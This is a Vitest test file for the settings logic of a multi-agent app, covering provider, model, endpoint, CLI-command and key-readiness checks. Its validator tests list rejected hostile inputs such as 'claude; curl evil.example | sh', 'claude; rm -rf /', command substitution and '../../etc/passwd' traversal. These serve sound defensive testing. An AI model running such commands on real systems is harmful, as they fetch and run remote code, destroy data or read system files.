import { describe, expect, it } from "vitest";
import {
  emptyConfigStatus,
  MAX_AGENTS,
  MAX_AGENT_NAME_LENGTH,
  MAX_MODEL_LENGTH,
  type AgentCompanion,
  type AgentConfigStatus,
  type ProviderId
} from "../shared/agents.js";
import {
  agentKeySource,
  agentKeySummary,
  agentReadiness,
  canCreateAgent,
  canDeleteAgent,
  canSaveAgent,
  canSaveOrchestrator,
  draftCommandPlaceholder,
  draftFrom,
  draftIsCli,
  draftModelPlaceholder,
  draftNeedsBaseUrl,
  draftNeedsModel,
  draftRole,
  emptyDraft,
  isValidBaseUrl,
  isValidCommand,
  isValidModel,
  orchestratorDraftFrom,
  providerName,
  providerReady,
  providerSummary,
  providerStatusFor,
  routeSummary,
  slugifyRole,
  toCompanionDraft,
  type AgentDraft,
  type OrchestratorDraft
} from "./command-center.js";

function companion(overrides: Partial<AgentCompanion> = {}): AgentCompanion {
  return {
    id: "companion-1",
    name: "Scout",
    role: "research",
    skillPaths: [],
    provider: null,
    model: null,
    baseUrl: null,
    command: null,
    ...overrides
  };
}

/** A config with a key stored for each named provider and for none other. */
function config(
  configured: readonly ProviderId[] = [],
  overrides: Partial<AgentConfigStatus> = {}
): AgentConfigStatus {
  const base = emptyConfigStatus();
  return {
    ...base,
    encryption: "available",
    providers: base.providers.map((provider) => ({
      ...provider,
      configured: configured.includes(provider.id)
    })),
    ...overrides
  };
}

function draft(overrides: Partial<AgentDraft> = {}): AgentDraft {
  return { ...emptyDraft(), name: "Ledger", ...overrides };
}

describe("slugifyRole", () => {
  it("turns what the user typed into an identifier the contract accepts", () => {
    expect(slugifyRole("Finance & Accounting")).toBe("finance-accounting");
    expect(slugifyRole("  Market  Research  ")).toBe("market-research");
  });

  it("leaves an already-valid slug alone", () => {
    expect(slugifyRole("research")).toBe("research");
  });

  it("yields nothing for text with no letters or digits in it", () => {
    expect(slugifyRole("——")).toBe("");
    expect(slugifyRole("")).toBe("");
  });
});

describe("draftRole", () => {
  it("prefers the role the user typed", () => {
    expect(draftRole(draft({ role: "Finance" }))).toBe("finance");
  });

  it("falls back to the name rather than refusing the save", () => {
    expect(draftRole(draft({ name: "Market Research", role: "" }))).toBe(
      "market-research"
    );
  });

  it("falls back again for a name that slugifies to nothing", () => {
    // A name in a script with no latin characters is a reason to pick a default
    // role, not a reason to block the agent from existing.
    expect(draftRole(draft({ name: "研究", role: "" }))).toBe("agent");
  });
});

describe("canSaveAgent", () => {
  it("refuses a blank name", () => {
    expect(canSaveAgent(draft({ name: "   " }))).toBe(false);
  });

  it("refuses a name past the contract bound, which the trusted side would reject", () => {
    expect(canSaveAgent(draft({ name: "x".repeat(MAX_AGENT_NAME_LENGTH + 1) }))).toBe(
      false
    );
  });

  it("treats a blank model as the provider's default rather than as an error", () => {
    expect(canSaveAgent(draft({ model: "" }))).toBe(true);
  });

  it("refuses a model the contract would reject", () => {
    expect(canSaveAgent(draft({ model: "model with spaces" }))).toBe(false);
    expect(canSaveAgent(draft({ model: "../../etc/passwd" }))).toBe(false);
  });
});

describe("isValidModel", () => {
  it("accepts the shapes real model names take", () => {
    for (const model of [
      "claude-opus-5",
      "gpt-5",
      "gemini-2.5-pro",
      "llama3.1",
      "moonshot-v1-32k",
      "qwen-max",
      // A router addresses models by vendor, so the slash has to survive.
      "anthropic/claude-opus-5"
    ]) {
      expect(isValidModel(model)).toBe(true);
    }
  });

  it("refuses traversal, empty segments, spaces, and an overlong name", () => {
    expect(isValidModel("vendor/../secret")).toBe(false);
    expect(isValidModel("vendor//model")).toBe(false);
    expect(isValidModel("/leading")).toBe(false);
    expect(isValidModel("two words")).toBe(false);
    expect(isValidModel("x".repeat(MAX_MODEL_LENGTH + 1))).toBe(false);
  });
});

describe("compatible-service drafts", () => {
  const compatible = (overrides: Partial<AgentDraft> = {}): AgentDraft =>
    draft({ provider: "openai-compatible", ...overrides });

  it("asks for an endpoint only where the endpoint is the user's to name", () => {
    expect(draftNeedsBaseUrl(compatible())).toBe(true);
    expect(draftNeedsBaseUrl(draft({ provider: "openrouter" }))).toBe(false);
    expect(draftNeedsBaseUrl(draft({ provider: null }))).toBe(false);
  });

  it("requires a model where the provider ships no default to fall back to", () => {
    expect(draftNeedsModel(compatible())).toBe(true);
    expect(draftNeedsModel(draft({ provider: "openrouter" }))).toBe(false);
  });

  it("refuses to save until both endpoint and model are named", () => {
    expect(canSaveAgent(compatible({ model: "llama-3.3" }))).toBe(false);
    expect(
      canSaveAgent(compatible({ baseUrl: "https://api.example.com/v1" }))
    ).toBe(false);
    expect(
      canSaveAgent(
        compatible({ model: "llama-3.3", baseUrl: "https://api.example.com/v1" })
      )
    ).toBe(true);
  });

  it("refuses a plaintext endpoint, which would put a key on the wire", () => {
    expect(
      canSaveAgent(compatible({ model: "llama-3.3", baseUrl: "http://api.example.com" }))
    ).toBe(false);
  });

  it("tells the user a model is required rather than leaving the box blank", () => {
    expect(draftModelPlaceholder(compatible(), config())).toContain("Required");
  });

  it("sends no endpoint for a provider that has a fixed one", () => {
    // Typed against one provider, then switched: the stale address must not
    // travel to a preset where it would look like it redirected the request.
    const stale = draft({
      provider: "openrouter",
      model: "anthropic/claude-opus-5",
      baseUrl: "https://api.example.com/v1"
    });

    expect(toCompanionDraft(stale).baseUrl).toBeNull();
  });

  it("carries the endpoint through where it belongs", () => {
    expect(
      toCompanionDraft(
        compatible({ model: "llama-3.3", baseUrl: " https://api.example.com/v1 " })
      ).baseUrl
    ).toBe("https://api.example.com/v1");
  });
});

describe("local CLI providers", () => {
  const cli = (overrides: Partial<AgentDraft> = {}): AgentDraft =>
    draft({ provider: "claude-code", ...overrides });

  it("asks for a program, not an endpoint", () => {
    expect(draftIsCli(cli())).toBe(true);
    expect(draftNeedsBaseUrl(cli())).toBe(false);
    expect(draftIsCli(draft({ provider: "openai-compatible" }))).toBe(false);
  });

  it("does not require a model, because the tool chooses its own", () => {
    expect(draftNeedsModel(cli())).toBe(false);
    expect(canSaveAgent(cli())).toBe(true);
    expect(draftModelPlaceholder(cli(), config())).toContain("Optional");
  });

  it("offers the preset's program as the placeholder", () => {
    expect(draftCommandPlaceholder(cli())).toBe("claude");
    expect(draftCommandPlaceholder(draft({ provider: "gemini-cli" }))).toBe("gemini");
    expect(draftCommandPlaceholder(draft({ provider: "openai" }))).toBe("");
  });

  it("accepts a path override and refuses a shell-shaped one", () => {
    expect(canSaveAgent(cli({ command: "/opt/claude/bin/claude" }))).toBe(true);
    expect(canSaveAgent(cli({ command: "C:\\Program Files\\Claude\\claude.exe" }))).toBe(
      true
    );
    expect(canSaveAgent(cli({ command: "claude; curl evil.example | sh" }))).toBe(false);
    expect(canSaveAgent(cli({ command: "../../bin/sh" }))).toBe(false);
  });

  it("sends no command for a provider that runs no program", () => {
    // Typed against a CLI, then switched: the stale executable must not travel
    // to an HTTP provider where nothing would read it.
    const stale = draft({ provider: "openrouter", command: "/opt/claude/bin/claude" });

    expect(toCompanionDraft(stale).command).toBeNull();
  });

  it("carries the program through where it belongs", () => {
    expect(toCompanionDraft(cli({ command: " /opt/claude/bin/claude " })).command).toBe(
      "/opt/claude/bin/claude"
    );
  });

  it("is ready with no key at all, and says why", () => {
    const agent = companion({ provider: "claude-code" });

    expect(agentReadiness(agent, config())).toBe("ready");
    expect(agentKeySource(agent, config())).toBe("not-needed");
    // "Signs in through its own CLI" is the honest claim — the session exists,
    // it is simply not this app's.
    expect(agentKeySummary(agent, config())).toContain("its own CLI");
  });

  it("stays ready even where no key could be stored at all", () => {
    const agent = companion({ provider: "codex" });

    expect(agentReadiness(agent, config([], { encryption: "no-keyring" }))).toBe("ready");
  });

  it("names the program in the route, because that is what would run", () => {
    expect(routeSummary(companion({ provider: "claude-code" }), config())).toBe(
      "Claude Code · claude"
    );
    expect(
      routeSummary(
        companion({ provider: "opencode", command: "/opt/opencode/bin/opencode" }),
        config()
      )
    ).toBe("OpenCode · /opt/opencode/bin/opencode");
  });

  it("names an explicit model override alongside the program", () => {
    expect(
      routeSummary(companion({ provider: "kimi-code", model: "kimi-k2" }), config())
    ).toBe("Kimi Code · kimi · kimi-k2");
  });
});

describe("isValidCommand", () => {
  it("accepts a program name and the paths a real install has", () => {
    expect(isValidCommand("claude")).toBe(true);
    expect(isValidCommand("/usr/local/bin/codex")).toBe(true);
    expect(isValidCommand("C:\\Program Files\\Gemini\\gemini.exe")).toBe(true);
  });

  it("refuses shell syntax, traversal, and punctuation-only names", () => {
    for (const command of [
      "claude; rm -rf /",
      "claude && curl evil.example",
      "claude | sh",
      "claude `whoami`",
      "claude $(whoami)",
      "../../bin/sh",
      "...",
      "/",
      ""
    ]) {
      expect(isValidCommand(command)).toBe(false);
    }
  });
});

describe("canSaveOrchestrator on a CLI", () => {
  it("applies with no model, since the tool picks one", () => {
    expect(
      canSaveOrchestrator(
        { provider: "claude-code", model: "", baseUrl: "", command: "" },
        config()
      )
    ).toBe(true);
  });

  it("refuses a program a shell would read as more than one command", () => {
    expect(
      canSaveOrchestrator(
        {
          provider: "claude-code",
          model: "",
          baseUrl: "",
          command: "claude && curl evil.example"
        },
        config()
      )
    ).toBe(false);
  });

  it("applies a change of program alone", () => {
    const saved = config([], { provider: "codex", model: "", command: "codex" });

    expect(canSaveOrchestrator(orchestratorDraftFrom(saved), saved)).toBe(false);
    expect(
      canSaveOrchestrator(
        { ...orchestratorDraftFrom(saved), command: "/opt/codex/bin/codex" },
        saved
      )
    ).toBe(true);
  });
});

describe("routeSummary with an endpoint", () => {
  it("names the host, because with a compatible service the host is the provider", () => {
    const pinned = companion({
      provider: "openai-compatible",
      model: "llama-3.3",
      baseUrl: "https://api.example.com/v1"
    });

    // Two agents both reading "OpenAI-compatible · llama-3.3" could be pointed
    // at entirely different machines.
    expect(routeSummary(pinned, config())).toBe(
      "OpenAI-compatible · llama-3.3 · api.example.com"
    );
  });
});

describe("toCompanionDraft", () => {
  it("normalises the form's empty strings back to the contract's nulls", () => {
    expect(toCompanionDraft(draft({ name: " Ledger ", role: "Finance", model: "  " }))).toEqual(
      {
        name: "Ledger",
        role: "finance",
        provider: null,
        model: null,
        baseUrl: null,
        command: null
      }
    );
  });

  it("carries a pinned provider and model through unchanged", () => {
    expect(
      toCompanionDraft(draft({ provider: "openai", model: " gpt-5 " }))
    ).toMatchObject({ provider: "openai", model: "gpt-5" });
  });
});

describe("draftFrom", () => {
  it("round-trips an agent into the form and back", () => {
    const pinned = companion({ provider: "openai", model: "gpt-5" });

    expect(toCompanionDraft(draftFrom(pinned))).toEqual({
      name: "Scout",
      role: "research",
      provider: "openai",
      model: "gpt-5",
      baseUrl: null,
      command: null
    });
  });

  it("shows an unpinned agent as following the orchestrator", () => {
    expect(draftFrom(companion()).provider).toBeNull();
  });
});

describe("providerReady", () => {
  it("is true for a local provider with no key stored", () => {
    const ollama = providerStatusFor(config(), "ollama");

    expect(ollama).not.toBeNull();
    expect(providerReady(ollama!)).toBe(true);
  });

  it("is false for a hosted provider until a key is stored", () => {
    expect(providerReady(providerStatusFor(config(), "anthropic")!)).toBe(false);
    expect(providerReady(providerStatusFor(config(["anthropic"]), "anthropic")!)).toBe(
      true
    );
  });
});

describe("providerSummary", () => {
  it("says a local provider needs no key rather than reporting one missing", () => {
    expect(providerSummary(providerStatusFor(config(), "ollama")!)).toContain(
      "no key needed"
    );
  });

  it("says a CLI signs itself in, and names the program it runs", () => {
    // Not the same claim as "no key needed": something does authenticate, it is
    // simply not this app.
    const summary = providerSummary(providerStatusFor(config(), "claude-code")!);

    expect(summary).toContain("its own CLI");
    expect(summary).toContain("claude");
  });

  it("distinguishes a stored key from a missing one", () => {
    expect(providerSummary(providerStatusFor(config(["openai"]), "openai")!)).toBe(
      "Key stored"
    );
    expect(providerSummary(providerStatusFor(config(), "openai")!)).toBe("No key stored");
  });
});

describe("providerName", () => {
  it("uses the provider's own casing", () => {
    expect(providerName("openai")).toBe("OpenAI");
    expect(providerName("anthropic")).toBe("Anthropic");
  });
});

describe("agentReadiness", () => {
  it("is ready when the pinned provider has a key", () => {
    const pinned = companion({ provider: "openai" });

    expect(agentReadiness(pinned, config(["openai"]))).toBe("ready");
  });

  it("needs a key when the pinned provider has none, even if another does", () => {
    const pinned = companion({ provider: "openai" });

    expect(agentReadiness(pinned, config(["anthropic"]))).toBe("needs-key");
  });

  it("follows the orchestrator's key state when the agent is not pinned", () => {
    expect(agentReadiness(companion(), config(["anthropic"]))).toBe("ready");
    expect(agentReadiness(companion(), config([]))).toBe("needs-key");
  });

  it("is ready against a local provider with no key at all", () => {
    const pinned = companion({ provider: "ollama" });

    expect(agentReadiness(pinned, config())).toBe("ready");
  });

  it("reports the storage refusal ahead of the missing key", () => {
    // When nothing can be stored, "needs a key" would name an action that has no
    // way to succeed.
    expect(agentReadiness(companion(), config([], { encryption: "no-keyring" }))).toBe(
      "no-encryption"
    );
  });

  it("still calls a local provider ready when nothing can be stored", () => {
    const pinned = companion({ provider: "ollama" });

    expect(agentReadiness(pinned, config([], { encryption: "unavailable" }))).toBe("ready");
  });
});

describe("routeSummary", () => {
  it("names where a pinned agent's work would go", () => {
    const pinned = companion({ provider: "openai", model: "gpt-5" });

    expect(routeSummary(pinned, config())).toBe("OpenAI · gpt-5");
  });

  it("says so when the route came from the orchestrator", () => {
    expect(routeSummary(companion(), config())).toBe(
      "Anthropic · claude-opus-5 · follows orchestrator"
    );
  });

  it("resolves a pinned provider with no model to that provider's default", () => {
    const pinned = companion({ provider: "google", model: null });

    expect(routeSummary(pinned, config())).toBe("Google · gemini-2.5-pro");
  });
});

describe("draftModelPlaceholder", () => {
  it("offers the orchestrator's model while the agent follows it", () => {
    expect(draftModelPlaceholder(draft(), config())).toBe("claude-opus-5");
  });

  it("offers the pinned provider's default once one is chosen", () => {
    expect(draftModelPlaceholder(draft({ provider: "google" }), config())).toBe(
      "gemini-2.5-pro"
    );
  });
});

describe("canSaveOrchestrator", () => {
  const orchestrator = (
    overrides: Partial<OrchestratorDraft> = {}
  ): OrchestratorDraft => ({
    provider: "anthropic",
    model: "claude-opus-5",
    baseUrl: "",
    command: "",
    ...overrides
  });

  it("has nothing to apply when the form matches what is saved", () => {
    const saved = config();

    expect(canSaveOrchestrator(orchestratorDraftFrom(saved), saved)).toBe(false);
  });

  it("applies a provider change", () => {
    expect(
      canSaveOrchestrator(orchestrator({ provider: "openai", model: "gpt-5" }), config())
    ).toBe(true);
  });

  it("applies a model change on the same provider", () => {
    expect(canSaveOrchestrator(orchestrator({ model: "claude-sonnet-5" }), config())).toBe(
      true
    );
  });

  it("refuses a model the contract would reject", () => {
    expect(canSaveOrchestrator(orchestrator({ model: "" }), config())).toBe(false);
    expect(canSaveOrchestrator(orchestrator({ model: "a b" }), config())).toBe(false);
  });

  it("refuses a compatible endpoint until the base URL is one a key may be sent to", () => {
    const compatible = orchestrator({ provider: "openai-compatible", model: "llama-3.3" });

    expect(canSaveOrchestrator(compatible, config())).toBe(false);
    expect(
      canSaveOrchestrator({ ...compatible, baseUrl: "http://api.example.com" }, config())
    ).toBe(false);
    expect(
      canSaveOrchestrator({ ...compatible, baseUrl: "https://api.example.com/v1" }, config())
    ).toBe(true);
  });

  it("applies a change of endpoint alone", () => {
    const saved = config([], {
      provider: "openai-compatible",
      model: "llama-3.3",
      baseUrl: "https://one.example/v1"
    });

    expect(canSaveOrchestrator(orchestratorDraftFrom(saved), saved)).toBe(false);
    expect(
      canSaveOrchestrator(
        { ...orchestratorDraftFrom(saved), baseUrl: "https://two.example/v1" },
        saved
      )
    ).toBe(true);
  });
});

describe("isValidBaseUrl", () => {
  it("accepts an ordinary https endpoint", () => {
    expect(isValidBaseUrl("https://api.example.com/v1")).toBe(true);
    expect(isValidBaseUrl("https://localhost:8443")).toBe(true);
  });

  it("refuses anything that would send a key somewhere it should not go", () => {
    // Plaintext first: this URL is where an API key is sent.
    expect(isValidBaseUrl("http://api.example.com/v1")).toBe(false);
    expect(isValidBaseUrl("https://user:secret@api.example.com")).toBe(false);
    expect(isValidBaseUrl("https://api.example.com?key=leaked")).toBe(false);
    expect(isValidBaseUrl("https://api.example.com#frag")).toBe(false);
    expect(isValidBaseUrl("file:///etc/passwd")).toBe(false);
    expect(isValidBaseUrl("not a url")).toBe(false);
    expect(isValidBaseUrl("")).toBe(false);
  });
});

describe("agent keys", () => {
  const pinned = companion({ id: "companion-2", provider: "openrouter" });

  function withOwnKey(): AgentConfigStatus {
    return config([], {
      agentCredentials: [{ companionId: "companion-2", provider: "openrouter" }]
    });
  }

  it("reports which key an agent is actually using", () => {
    expect(agentKeySource(pinned, config())).toBe("none");
    expect(agentKeySource(pinned, config(["openrouter"]))).toBe("shared");
    expect(agentKeySource(pinned, withOwnKey())).toBe("own");
    expect(agentKeySource(companion({ provider: "ollama" }), config())).toBe("not-needed");
  });

  it("prefers the agent's own key over the shared one", () => {
    // Both present: the agent's own is what a request would authenticate with,
    // and the panel must not imply otherwise.
    const both = config(["openrouter"], {
      agentCredentials: [{ companionId: "companion-2", provider: "openrouter" }]
    });

    expect(agentKeySource(pinned, both)).toBe("own");
  });

  it("counts an agent's own key as making it ready with no shared key at all", () => {
    expect(agentReadiness(pinned, config())).toBe("needs-key");
    expect(agentReadiness(pinned, withOwnKey())).toBe("ready");
  });

  it("does not carry a key across a provider change", () => {
    const moved = companion({ id: "companion-2", provider: "openai" });

    expect(agentKeySource(moved, withOwnKey())).toBe("none");
  });

  it("says whose key is in force, in words the user can act on", () => {
    expect(agentKeySummary(pinned, withOwnKey())).toContain("its own");
    expect(agentKeySummary(pinned, config(["openrouter"]))).toContain("shared");
    expect(agentKeySummary(companion({ provider: "ollama" }), config())).toContain(
      "no key"
    );
  });
});

describe("roster bounds", () => {
  const roster = (count: number): readonly AgentCompanion[] =>
    Array.from({ length: count }, (_, index) => companion({ id: `companion-${index}` }));

  it("stops offering creation at the contract cap", () => {
    expect(canCreateAgent(roster(MAX_AGENTS - 1))).toBe(true);
    expect(canCreateAgent(roster(MAX_AGENTS))).toBe(false);
  });

  it("keeps the last agent, which the composer still needs", () => {
    expect(canDeleteAgent(roster(1))).toBe(false);
    expect(canDeleteAgent(roster(2))).toBe(true);
  });
});
